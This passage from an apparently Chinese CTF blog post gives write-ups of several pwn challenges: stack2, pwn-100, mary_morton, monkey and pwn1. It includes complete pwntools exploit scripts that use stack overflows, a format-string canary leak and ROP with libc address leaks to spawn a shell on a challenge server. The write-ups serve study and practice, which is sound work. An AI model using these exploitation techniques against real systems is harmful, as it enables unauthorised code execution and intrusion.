+<p>可以看到退出时调用函数所在栈的位置是FF942CEC，那么我们就要修改FF942CEC的值，那就可以得到偏移量为FF942CEC-FF942C68=0x84。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="number">57626</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;../files/stack2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;How many numbers you have:\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Give me your numbers\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x84</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendaddr</span>(<span class="params">offset,addr</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;5. exit&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(offset))</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line">sendaddr(offset, <span class="number">0x9B</span>)</span><br><span class="line">sendaddr(offset + <span class="number">1</span>, <span class="number">0x85</span>)</span><br><span class="line">sendaddr(offset + <span class="number">2</span>, <span class="number">0x04</span>)</span><br><span class="line">sendaddr(offset + <span class="number">3</span>, <span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;5. exit&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>运行发现错误：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568299593922.png" class="" width="1568299593922">
+<p>就感觉/bash怪怪的，那看来得自己传参了。由于system传入sh也可以执行shell，所以我们直接使用程序中的现成的sh就可以了。</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568301479701.png" class="" width="1568301479701">
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="number">57626</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;../files/stack2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;How many numbers you have:\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Give me your numbers\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sys_addr = e.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;system_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys_addr)))</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x84</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendaddr</span>(<span class="params">offset,addr</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;5. exit&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(offset))</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"><span class="comment">#sys_addr</span></span><br><span class="line">sendaddr(offset, <span class="number">0x50</span>)</span><br><span class="line">sendaddr(offset + <span class="number">1</span>, <span class="number">0x84</span>)</span><br><span class="line">sendaddr(offset + <span class="number">2</span>, <span class="number">0x04</span>)</span><br><span class="line">sendaddr(offset + <span class="number">3</span>, <span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">offset += <span class="number">8</span></span><br><span class="line"><span class="comment">#sh_addr</span></span><br><span class="line">sendaddr(offset, <span class="number">0x87</span>)</span><br><span class="line">sendaddr(offset + <span class="number">1</span>, <span class="number">0x89</span>)</span><br><span class="line">sendaddr(offset + <span class="number">2</span>, <span class="number">0x04</span>)</span><br><span class="line">sendaddr(offset + <span class="number">3</span>, <span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;5. exit&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>获得shell，得到flag：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568301778145.png" class="" width="1568301778145">
+<h1 id="pwn-100">pwn-100</h1>
+<p>这是一个64位的ELF文件：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568260260975.png" class="" width="1568260260975">
+<p>IDA看一下源码：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568260146451.png" class="" width="1568260146451">
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568265875900.png" class="" width="1568265875900">
+<p>v1存在栈溢出漏洞。程序中没有system函数，没有/bin/sh，由于是64位程序，所以需要利用ROP来传参数，关于ROP的学习，推荐个大佬的博客：<a
+target="_blank" rel="noopener" href="https://chybeta.github.io/2017/06/26/ROP学习：64位栈溢出/">ROP学习：64位栈溢出</a>。</p>
+<p>程序中有read，puts，所以思路是调用puts把read的绝对地址泄露出来然后找到libc版本和偏移量把system和/bin/sh的地址找到，再调用system，传入/bin/sh拿到shell。参数通过ROP方法传递。</p>
+<p>首先寻找ROP：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568261009433.png" class="" width="1568261009433">
+<p>由于我们要用的puts和system函数都只需要一个参数，所以只需要rdi就可以。pop
+rdi; ret 的地址为0x0000000000400763。</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;../files/pwn-100&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">30013</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;../files/pwn-100&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vuln = <span class="number">0x40068e</span> <span class="comment">#是sub_40068E()的地址</span></span><br><span class="line">read_got = e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400763</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;read_got_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_got)))</span><br><span class="line">log.success(<span class="string">&#x27;puts_plt_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_plt)))</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x48</span> </span><br><span class="line">payload1 += p64(pop_rdi) + p64(read_got) + p64(puts_plt) <span class="comment">#把read_got传入rdi，然后调用puts，puts把read_got打印出来</span></span><br><span class="line">payload1 += p64(vuln) <span class="comment">#返回sub_40068E()函数准备第二次继续攻击</span></span><br><span class="line">payload1 += <span class="string">&#x27;a&#x27;</span> * (<span class="number">200</span> - <span class="built_in">len</span>(payload1)) <span class="comment">#程序要求一次需要输入200个字符，所以最后填满</span></span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recv()  <span class="comment">#回显bye~</span></span><br><span class="line">read_leak = u64(p.recv()[<span class="number">1</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>)) <span class="comment">#得到read的绝对坐标</span></span><br><span class="line">log.success(<span class="string">&#x27;read_leak_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_leak)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_leak)</span><br><span class="line">libc_base = read_leak - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr:&#x27;</span>, <span class="built_in">hex</span>(sys_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;bin_sh_addr:&#x27;</span>, <span class="built_in">hex</span>(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x48</span></span><br><span class="line">payload2 += p64(pop_rdi) + p64(bin_sh_addr) + p64(sys_addr)  <span class="comment">#system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">payload2 += <span class="string">&#x27;a&#x27;</span> * (<span class="number">200</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>执行exp，选择libc版本选0，得到shell：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568302057127.png" class="" width="1568302057127">
+<p>得到flag：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568266254184.png" class="" width="1568266254184">
+<h1 id="mary_morton">mary_morton</h1>
+<p>题目描述：非常简单的热身pwn</p>
+<p>首先看一下源码：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572066823941.png" class="" width="1572066823941">
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572066856025.png" class="" width="1572066856025">
+<p>可以看到我们可以选择栈溢出漏洞或者是格式化字符串漏洞。</p>
+<p>首先看一下栈溢出漏洞：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572066925488.png" class="" width="1572066925488">
+<p>buf是很典型的栈溢出。</p>
+<p>再看一下格式化字符串漏洞：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572066976502.png" class="" width="1572066976502">
+<p>也是很典型的格式化字符串漏洞。</p>
+<p>程序中还有一个目标函数：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572067033370.png" class="" width="1572067033370">
+<p>那么思路很明确，就是栈溢出让程序返回到cat_flag（名字是我改的）得到flag就行了。但是这个程序有个问题，它开启了canary保护。</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572067142663.png" class="" width="1572067142663">
+<p>所以我们没办法直接进行栈溢出，否则就会报错，因此我们要绕过canary保护，这方面知识可以看<a
+target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/">CTFwiki</a>。</p>
+<p>要绕过canary保护，其中一种方式是知道canary是多少，程序中可以看到canary的偏移量是0x90-8=0x88：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572067798113.png" class="" width="1572067798113">
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572067814376.png" class="" width="1572067814376">
+<p>那么思路就是我们通过格式化字符串漏洞得知canary的值然后在栈溢出的时候把canary写进去，这样就可以绕过canary保护。</p>
+<p>要想知道canary的值，就得知道canary在内存中的地址，我们通过代码可以知道格式化字符串的偏移量是6，而我们输入参数（buf）和canary之间的偏移为0x90
+- 8 = 0x88字节，八个字节为一组，0x88 / 8 =
+17，也就是说格式化字符串到canary的偏移是17+6=23，那么我们用<code>%23$p</code>就可以看到偏移量为23的内存的内容了。这样就可以得到canary。后面就是简单的栈溢出了。</p>
+<p>构造exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="number">58615</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;../files/mary_morton&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;../files/mary_morton&#x27;</span>)</span><br><span class="line"></span><br><span class="line">get_flag = <span class="number">0x4008da</span></span><br><span class="line">format_offset = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%23$p&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;battle&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;battle&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span> + p64(canary) + <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(get_flag)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>得到flag：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572067848834.png" class="" width="1572067848834">
+<h1 id="monkey">monkey</h1>
+<p>这个题给了个js，打开之后是一个js
+shell，由于我不会js，我刚开始看的时候毫无头绪，还是用传统的方法打开IDA分析，啥也没看出来。后来发现这个题其实如果你知道js相关的知识就很简单了，js有个os.system函数，直接os.system("/bin/sh")就可以获取shell了。</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191030110610797.png" class="" title="image-20191030110610797">
+<h1 id="pwn1">pwn1</h1>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191102091949539.png" class="" title="image-20191102091949539">
+<p>先运行看看：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191102092031860.png" class="" title="image-20191102092031860">
+<p>IDA打开看一下源码：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191102091742929.png" class="" title="image-20191102091742929">
+<p>可以看到一个典型的栈溢出，要构造的肯定是&amp;s了。这个题没有现成的获取flag目标函数，因此我们就需要ROP。同时这个题有canary，因此我们需要绕过canary。</p>
+<p>看一下&amp;s：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191102160837726.png" class="" title="image-20191102160837726">
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191102160909600.png" class="" title="image-20191102160909600">
+<p>var_8就是我们要获取的canary。</p>
+<p>main函数的起始地址是0x400908。</p>
+<p>那么思路就是首先通过puts得到canary，然后通过puts爆出read的真实地址，找到libc，然后在用libc中的system和/bin/sh反弹shell。要注意的一点就是canary的最后两位不是0a，而是，因为我们在构造的时候输入0x88个a时还输入了一个回车，这个回车把canary最后的00覆盖成了0a。正是这个覆盖才让puts能输出canary。</p>
+<p>64位通过rdi传参，首先获得rdi地址：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191102160330688.png" class="" title="image-20191102160330688">
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;../files/babystack&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">56221</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;../files/babystack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="number">0x0000000000400a93</span></span><br><span class="line">start = <span class="number">0x400908</span></span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;puts_plt_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_plt)))</span><br><span class="line">log.success(<span class="string">&#x27;read_got_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_got)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#found canary</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;canary =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(canary)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#found real_read_address</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span> + p64(canary) + <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(rdi_addr) + p64(read_got) + p64(puts_plt)</span><br><span class="line">payload += p64(start)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">real_read = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;real_read_address =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(real_read)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#ROP</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>,real_read)</span><br><span class="line">libc_base = real_read - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;libc_base_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&#x27;system_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys_addr)))</span><br><span class="line">log.success(<span class="string">&#x27;bin_sh_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(bin_sh_addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get_shell</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span> + p64(canary) + <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(rdi_addr) + p64(bin_sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>运行，选择题目给的libc，得到flag：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191102160654357.png" class="" title="image-20191102160654357">
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2019/08/30/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/" rel="prev" title="攻防世界逆向高手进阶">
+                  <i class="fa fa-angle-left"></i> 攻防世界逆向高手进阶
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/" rel="next" title="buuctf-pwn刷题之旅">
+                  buuctf-pwn刷题之旅 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Winny</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
